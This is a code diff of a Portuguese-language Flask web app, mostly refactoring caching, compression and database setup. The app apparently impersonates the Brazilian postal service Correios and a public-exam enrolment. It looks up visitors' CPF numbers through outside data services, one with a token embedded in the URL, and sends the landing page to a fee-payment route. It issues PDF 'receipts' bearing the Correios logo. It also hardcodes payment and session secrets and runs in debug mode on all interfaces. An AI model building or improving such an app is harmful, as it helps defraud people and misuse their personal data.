@@ -1,72 +1,72 @@
 import os
-from datetime import datetime
-from flask_weasyprint import HTML, render_pdf
-import requests
 import logging
 import random
 import gzip
+from datetime import datetime, timedelta
 from typing import Dict, Any, List
-from flask import Flask, render_template, url_for, request, redirect, flash, session, jsonify
-from flask_caching import Cache
-from flask_sqlalchemy import SQLAlchemy
-from flask_migrate import Migrate
 import base64
+import requests
 
-# Configuração do logging
-logging.basicConfig(level=logging.DEBUG)
-logger = logging.getLogger(__name__)
+from flask import Flask, render_template, url_for, request, redirect, flash, session, jsonify, send_from_directory
+from flask_sqlalchemy import SQLAlchemy
+from sqlalchemy.orm import DeclarativeBase
+from flask_caching import Cache
+from flask_weasyprint import HTML, render_pdf
 
-# Verificação das variáveis de ambiente
-database_url = os.environ.get("DATABASE_URL")
-if not database_url:
-    raise ValueError("DATABASE_URL environment variable is not set")
-logger.info(f"Database URL found: {database_url.split(':')[0]}")
+class Base(DeclarativeBase):
+    pass
 
-# Inicialização do Flask e configurações
+db = SQLAlchemy(model_class=Base)
+# create the app
 app = Flask(__name__)
-app.secret_key = os.environ.get("FLASK_SECRET_KEY")
-app.static_folder = 'static'
+# setup a secret key, required by sessions
+app.secret_key = os.environ.get("FLASK_SECRET_KEY") or "a secret key"
 
-# Configuração do cache
-cache = Cache(app, config={
-    'CACHE_TYPE': 'simple',
-    'CACHE_DEFAULT_TIMEOUT': 600
-})
-
-# Configuração do SQLAlchemy
-app.config["SQLALCHEMY_DATABASE_URI"] = database_url
+# Configure SQLAlchemy with optimized pool settings
+app.config["SQLALCHEMY_DATABASE_URI"] = os.environ.get("DATABASE_URL")
 app.config["SQLALCHEMY_ENGINE_OPTIONS"] = {
-    "pool_size": 5,
-    "max_overflow": 10,
-    "pool_timeout": 30,
+    "pool_size": 10,  # Increased pool size
+    "max_overflow": 15,  # Increased max overflow
     "pool_recycle": 300,
+    "pool_timeout": 30,
     "pool_pre_ping": True,
 }
 app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
 
-logger.info("Initializing SQLAlchemy with configuration")
-# Inicialização do SQLAlchemy e Flask-Migrate
-db = SQLAlchemy(app)
-migrate = Migrate(app, db)
-logger.info("SQLAlchemy and Flask-Migrate initialized successfully")
+# Configure caching
+cache = Cache(app, config={
+    'CACHE_TYPE': 'simple',
+    'CACHE_DEFAULT_TIMEOUT': 600,
+    'CACHE_THRESHOLD': 1000  # Increase cache size
+})
 
-# Importa os modelos após a inicialização do db
-from models import Usuario, Pagamento  # noqa
+# Static file configuration
+app.static_folder = 'static'
+app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 3600  # Cache static files for 1 hour
 
-# Cria as tabelas no banco de dados
-with app.app_context():
-    try:
-        logger.info("Attempting to create database tables")
-        db.create_all()
-        logger.info("Database tables created successfully")
-    except Exception as e:
-        logger.error(f"Error creating database tables: {str(e)}")
-        raise
+# initialize the app with the extension
+db.init_app(app)
 
-# Middleware de compressão
+# Configuração do logging
+logging.basicConfig(level=logging.INFO)  # Changed to INFO level for production
+logger = logging.getLogger(__name__)
+
+# Cache headers for static files
+@app.after_request
+def add_header(response):
+    if 'Cache-Control' not in response.headers:
+        if request.path.startswith('/static/'):
+            # Cache static files for 1 hour
+            response.headers['Cache-Control'] = 'public, max-age=3600'
+        else:
+            # Don't cache other responses
+            response.headers['Cache-Control'] = 'no-store'
+    return response
+
+# Optimized GZIP compression
 def gzip_response(response):
-    # Não comprimir arquivos estáticos
-    if request.path.startswith('/static/'):
+    # Don't compress small responses or static files
+    if len(response.data) < 500 or request.path.startswith('/static/'):
         return response
 
     accept_encoding = request.headers.get('Accept-Encoding', '')
@@ -77,15 +77,12 @@ def gzip_response(response):
         'Content-Encoding' in response.headers):
         return response
 
-    # Só comprimir se a resposta tiver dados
-    if not response.data:
-        return response
-
     try:
-        gzip_buffer = gzip.compress(response.data)
+        gzip_buffer = gzip.compress(response.data, compresslevel=6)
         response.data = gzip_buffer
         response.headers['Content-Encoding'] = 'gzip'
         response.headers['Content-Length'] = len(response.data)
+        response.headers['Vary'] = 'Accept-Encoding'
     except Exception as e:
         logger.error(f"Erro na compressão: {str(e)}")
         return response
@@ -95,6 +92,17 @@ def gzip_response(response):
 @app.after_request
 def after_request(response):
     return gzip_response(response)
+
+# Initialize database
+with app.app_context():
+    import models  # noqa: F401
+    db.create_all()
+
+# Cache static files
+@app.route('/static/<path:filename>')
+@cache.cached(timeout=3600)  # Cache for 1 hour
+def serve_static(filename):
+    return send_from_directory(app.static_folder, filename)
 
 API_URL = "https://consulta.fontesderenda.blog/?token=4da265ab-0452-4f87-86be-8d83a04a745a&cpf={cpf}"
 
@@ -491,17 +499,6 @@ def create_payment_api() -> For4PaymentsAPI:
     secret_key = os.environ.get("FOR4PAYMENTS_SECRET_KEY", "ff127456-ef71-4f49-ba84-21ec10b95d65")
     return For4PaymentsAPI(secret_key)
 
-@app.route('/')
-@cache.cached(timeout=60)  # Cache da página inicial por 1 minuto
-def index():
-    today = datetime.now()
-    logger.debug(f"Current date - Year: {today.year}, Month: {today.month}, Day: {today.day}")
-    return render_template('index.html', 
-                         current_year=today.year,
-                         current_month=str(today.month).zfill(2),
-                         current_day=str(today.day).zfill(2))
-
-
 @app.route('/frete_apostila', methods=['GET', 'POST'])
 def frete_apostila():
     user_data = session.get('dados_usuario') 
@@ -656,8 +653,9 @@ def categoria(tipo):
                          current_year=datetime.now().year,
                          user_data=user_data)
 
+@app.route('/')
 @app.route('/taxa')
-@cache.cached(timeout=300)  # Cache por 5 minutos
+@cache.cached(timeout=300)  # Cache for 5 minutes
 def taxa():
     return render_template('taxa.html', current_year=datetime.now().year)
 
@@ -671,7 +669,6 @@ def verificar_taxa():
         return redirect(url_for('taxa'))
 
     try:
-        # Consulta à API
         response = requests.get(
             f"https://concursos-brasil.org/api_clientes.php?cpf={cpf_numerico}",
             timeout=30
@@ -761,16 +758,6 @@ def inscricao_confirmada():
                          dados=dados,
                          current_year=datetime.now().year)
 
-def get_base64_logo():
-    try:
-        logo_path = os.path.join('attached_assets', 'Correios_(1990).svg.png')
-        with open(logo_path, 'rb') as image_file:
-            encoded_string = base64.b64encode(image_file.read()).decode()
-            return encoded_string
-    except Exception as e:
-        logger.error(f"Error loading logo: {str(e)}")
-        return ""
-
 @app.route('/download_comprovante')
 def download_comprovante():
     dados = session.get('dados_taxa')
@@ -789,14 +776,26 @@ def generate_pdf():
             flash('Sessão expirada. Por favor, faça a consulta novamente.')
             return redirect(url_for('taxa'))
 
+        # Clean up the name by removing trailing 'X'
+        if dados.get('name'):
+            dados['name'] = dados['name'].rstrip('X').strip()
+
         # Get user's city from IP
         ip_address = get_client_ip()
         cidade_prova = get_estado_from_ip(ip_address)
 
         # Get base64 encoded logo
-        correios_logo = get_base64_logo()
+        logo_path = os.path.join(app.static_folder, 'logo-correios.png')
+        correios_logo = ""
+        try:
+            with open(logo_path, 'rb') as image_file:
+                correios_logo = base64.b64encode(image_file.read()).decode()
+        except Exception as e:
+            logger.error(f"Error loading logo: {str(e)}")
+            # Use a fallback logo URL if local file fails
+            correios_logo = "https://logodownload.org/wp-content/uploads/2014/05/correios-logo-1-1.png"
 
-        # Generate PDF
+        # Generate PDF with optimized layout
         html = render_template('comprovante_inscricao.html',
                            dados=dados,
                            cidade_prova=cidade_prova,
@@ -804,13 +803,17 @@ def generate_pdf():
                            current_time=datetime.now().strftime('%H:%M:%S'),
                            correios_logo=correios_logo)
 
-        # Generate PDF
+        # Generate PDF with compression
         pdf = render_pdf(HTML(string=html))
 
-        # Add headers to force download
+        # Add headers for mobile download
         response = pdf
         response.headers['Content-Type'] = 'application/pdf'
         response.headers['Content-Disposition'] = 'attachment; filename=comprovante_inscricao_correios.pdf'
+        response.headers['Content-Length'] = len(response.get_data())
+        response.headers['Cache-Control'] = 'no-cache'
+        response.headers['Pragma'] = 'no-cache'
+        response.headers['Expires'] = '0'
 
         return response
 
@@ -819,6 +822,17 @@ def generate_pdf():
         return "Erro ao gerar o PDF. Por favor, tente novamente.", 500
 
 from datetime import timedelta
+from models import Usuario, Pagamento  # noqa
+
+# Cria as tabelas no banco de dados
+with app.app_context():
+    try:
+        logger.info("Attempting to create database tables")
+        db.create_all()
+        logger.info("Database tables created successfully")
+    except Exception as e:
+        logger.error(f"Error creating database tables: {str(e)}")
+        raise
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
